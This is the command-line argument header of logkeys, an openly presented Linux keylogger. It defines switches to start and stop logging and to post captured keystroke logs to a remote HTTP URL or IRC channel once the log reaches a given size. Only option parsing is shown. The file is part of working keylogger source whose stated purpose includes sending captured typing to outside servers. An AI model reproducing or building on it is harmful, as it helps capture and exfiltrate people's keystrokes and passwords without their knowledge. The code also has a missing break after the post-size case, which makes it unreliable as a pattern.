/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: http://code.google.com/p/logkeys/
*/

#ifndef _ARGS_H_
#define _ARGS_H_

#include <cstring>

namespace logkeys {

struct arguments
{
  bool start;          // start keylogger, -s switch
  bool kill;           // stop keylogger, -k switch
  bool us_keymap;      // use default US keymap, -u switch
  bool timestamp_every;          // log timestamp for every key, -e switch
  std::string logfile;      // user-specified log filename, -o switch
  std::string keymap;       // user-specified keymap file, -m switch or --export-keymap
  std::string device;       // user-specified input event device, given with -d switch
  std::string http_url;     // remote HTTP URL to POST log to, --post-http switch
  std::string irc_entity;   // if --post-irc effective, this holds the IRC entity to PRIVMSG (either #channel or NickName)
  std::string irc_server;   // if --post-irc effective, this holds the IRC hostname
  std::string irc_port;     // if --post-irc effective, this holds the IRC port number
  off_t post_size;     // post log file to remote when of size post_size, --post-size switch
  int flags;           // holds the following option flags
#define FLAG_EXPORT_KEYMAP    0x1  // export keymap obtained from dumpkeys, --export-keymap is used
#define FLAG_NO_FUNC_KEYS     0x2  // only log character keys (e.g. 'c', '2', etc.) and don't log function keys (e.g. <LShift>, etc.), --no-func-keys switch
#define FLAG_NO_TIMESTAMPS    0x4  // don't log timestamps, --no-timestamps switch
#define FLAG_POST_HTTP        0x8  // post log to remote HTTP server, --post-http switch
#define FLAG_POST_IRC        0x10  // post log to remote IRC server, --post-irc switch
#define FLAG_POST_SIZE       0x20  // post log to remote HTTP or IRC server when log of size optarg, --post-size
#define FLAG_TIMESTAMP_EVERY 0x40  // log timestamps on every key, --timestamp-every switch
} args = {0};  // default all args to 0x0 or ""


void process_command_line_arguments(int argc, char **argv)
{
  int flags;
  
  struct option long_options[] = {
    {"start",     no_argument,       0, 's'},
    {"keymap",    required_argument, 0, 'm'},
    {"output",    required_argument, 0, 'o'},
    {"us-keymap", no_argument,       0, 'u'},
    {"kill",      no_argument,       0, 'k'},
    {"device",    required_argument, 0, 'd'},
    {"help",      no_argument,       0, '?'},
    {"export-keymap", required_argument, &flags, FLAG_EXPORT_KEYMAP},
    {"no-func-keys",  no_argument,       &flags, FLAG_NO_FUNC_KEYS},
    {"no-timestamps", no_argument,       &flags, FLAG_NO_TIMESTAMPS},
    {"post-http",     required_argument, &flags, FLAG_POST_HTTP},
    {"post-irc",      required_argument, &flags, FLAG_POST_IRC},
    {"post-size",     required_argument, &flags, FLAG_POST_SIZE},
    {"timestamp-every", no_argument,     &flags, FLAG_TIMESTAMP_EVERY},
    {0}
  };
  
  char c;
  int option_index;

  while ((c = getopt_long(argc, argv, "sm:o:ukd:?", long_options, &option_index)) != -1)
  {
    switch (c) 
    {
      case 's': args.start = true;     break;
      case 'm': args.keymap = optarg;  break;
      case 'o': args.logfile = optarg; break;
      case 'u': args.us_keymap = true; break;
      case 'k': args.kill = true;      break;
      case 'd': args.device = optarg;  break;
      
      case  0 : 
        args.flags |= flags;
        switch (flags) 
        {
          case FLAG_EXPORT_KEYMAP: args.keymap = optarg; break;
          
          case FLAG_POST_HTTP:
            if (strncmp(optarg, "http://", 7)  != 0)
              error(EXIT_FAILURE, 0, "HTTP URL must be like \"http://domain:port/script\"");
            args.http_url = optarg; 
            break;
          
          case FLAG_POST_IRC: {
            // optarg string should be like "entity@server:port", now dissect it
            char *main_sep = strrchr(optarg, '@');
            char *port_sep = strrchr(optarg, ':');
            if (main_sep == NULL || port_sep == NULL)
              error(EXIT_FAILURE, 0, "Invalid IRC FORMAT! Must be: nick_or_channel@server:port. See manual!");
            *main_sep = '\0';  // replace @ with \0 to have entity string that starts at optarg
            *port_sep = '\0';  // replace : with \0 to have server string that starts at main_sep+1
            args.irc_entity = optarg;
            args.irc_server = main_sep + 1;
            args.irc_port = port_sep + 1;
            break;
          }
          
          case FLAG_POST_SIZE:
            args.post_size = atoi(optarg); 
            switch (optarg[strlen(optarg) - 1])  // process any trailing M(egabytes) or K(ilobytes)
            {
              case 'K': case 'k': args.post_size *= 1000;    break;
              case 'M': case 'm': args.post_size *= 1000000; break;
            }

          case FLAG_TIMESTAMP_EVERY: args.timestamp_every = true; break;
        }
        break;
      
      case '?': usage(); exit(EXIT_SUCCESS);
      default : usage(); exit(EXIT_FAILURE);
    }
  } // while
  
  while(optind < argc)
    error(0, 0, "Non-option argument %s", argv[optind++]);
}

} // namespace logkeys
#endif  // _ARGS_H_
